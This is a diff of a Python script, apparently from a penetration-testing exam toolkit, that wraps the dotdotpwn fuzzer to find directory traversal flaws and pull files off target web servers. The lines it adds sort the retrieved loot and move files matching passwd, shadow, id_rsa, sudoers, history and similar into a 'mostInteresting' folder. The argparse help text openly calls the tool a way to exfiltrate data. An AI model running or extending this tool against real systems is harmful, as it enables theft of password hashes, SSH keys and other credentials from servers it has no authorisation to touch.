@@ -12,6 +12,8 @@ import argparse
 import multiprocessing
 from multiprocessing import Process, Queue
 import requests
+import time
+from shutil import move
     
 #This function currently runs regular and an extension web scans using ddpwn on a list of URLs
 #If something is found, it will output the result to the /dirb/ directory
@@ -137,6 +139,10 @@ def retrieve():
     except:
         raise
     sortRetrievedFiles()
+    time.sleep(1)
+    sortMostInterestingFiles()
+    time.sleep(1)
+    sortEverythingElse()
     print "INFO: Downloading of files complete"
 
 def grabFileFromURL(url):
@@ -166,13 +172,48 @@ def sortRetrievedFiles():
         try:
             os.makedirs(str(sizeOfitems))
         except:
-            continue
+            pass
             #print "Warning: Dir already exists"
         for items in files:
             if os.path.getsize(items) == sizeOfitems:
                 newpath = "./%s/%s" % (str(sizeOfitems),items)
                 os.rename(items,newpath)
                 files.remove(items)
+
+def sortMostInterestingFiles():
+    downloadDir = "/root/scripts/recon_enum/results/exam/dotdotpwn/"
+    os.chdir(downloadDir)
+    files = os.listdir(downloadDir)
+    mostInterestingFiles = "passwd","shadow","id_rsa","id_dsa","passdb","samba","ssh","authorized","sudoers","history"
+    try:
+        os.makedirs("mostInteresting")
+    except:
+        pass
+    for item in files:
+        for name in mostInterestingFiles:
+            if (name in item):
+                new = "./mostInteresting/%s" % (item)
+                move(item,new)
+                break
+
+def sortEverythingElse():
+    downloadDir = "/root/scripts/recon_enum/results/exam/dotdotpwn/"
+    os.chdir(downloadDir)
+    files = os.listdir(downloadDir)
+    everythingElse = "etc","var","proc"
+    try:
+        for folder in everythingElse:
+            os.makedirs(folder)
+    except:
+        pass
+    for item in files:
+        for name in everythingElse:
+            if (os.path.isdir(item)):
+                break
+            if (name in item):
+                new = "./%s/%s" % (name,item)
+                move(item,new)
+                break
 
 ##1, grab port
 ##2, output file cannot have "/" in filename
@@ -274,14 +315,14 @@ def analyzeVuln(vulnar):
     
 if __name__=='__main__':
 
-    parser = argparse.ArgumentParser(description='Rough script to handle discovery of and exfiltration of data through directory traversal')
+    parser = argparse.ArgumentParser(description='Rough script to handle discovery of and exfiltration of data through directory traversal. Recommend invoke with: dirTrav <URLs> <os> -sr')
     parser.add_argument('-d', '--scan-depth', type=int, action="store", dest="depth", default=10, help="depth of ../../../ to extend to, default of 10")
     parser.add_argument('-e', '--extensions', type=str, action="store", dest="extensions", default='".html"', help='extensions appended at the end of each fuzz string (e.g. \'".php", ".jpg", ".inc"\'  Entire list needs to be encased in single quotes. Each extension needs to be in double quotes. There needs to be a comma and a space between each extension)')
     parser.add_argument('file', type=str, help="file with URLs to fuzz")
     parser.add_argument('os', type=str, action="store", help="OS greatly helps reduce false positives and reduces scan time. 'windows' or 'unix'")
     parser.add_argument('-s', '--scan', action="store_true", dest="scan", default="true", help="scan the target for directory traversal")
     parser.add_argument('-sr', '--scan-and-retrieve', nargs='?', const='true', default='false', dest="scan_and_retrieve", help="scan and retrieve files if a directory traversal is found")
-    parser.add_argument('-x', '--xfil-files', type=str, action="store", dest="xfil_files", default="/root/lists/Personal/Misc Lists/DirTrav/linux_all.txt", help="list of files to retrieve if a directory traversal vulnerability is found. Default is linux_all.txt.")
+    parser.add_argument('-x', '--xfil-files', type=str, action="store", dest="xfil_files", default="/root/lists/Personal/DirTrav/linux_all.txt", help="list of files to retrieve if a directory traversal vulnerability is found. Default is linux_all.txt.")
     
     args = parser.parse_args()
     #print args
